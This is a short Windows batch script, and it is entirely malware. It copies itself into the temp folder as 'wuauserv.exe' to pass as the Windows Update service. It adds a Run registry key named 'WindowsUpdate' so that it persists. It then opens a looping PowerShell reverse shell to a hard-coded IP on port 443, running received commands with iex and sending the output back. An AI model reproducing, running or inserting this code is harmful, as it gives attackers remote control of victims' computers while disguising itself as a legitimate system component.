@echo off
setlocal

SET MY_IP=192.168.1.19
SET PORT=443

if exist "%temp%\wuauserv.exe" goto :EXECUTE
copy "%~f0" "%temp%\wuauserv.exe" >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%temp%\wuauserv.exe" /f >nul

:EXECUTE
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%MY_IP%', %PORT%); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};$client.Close()"

goto :EXECUTE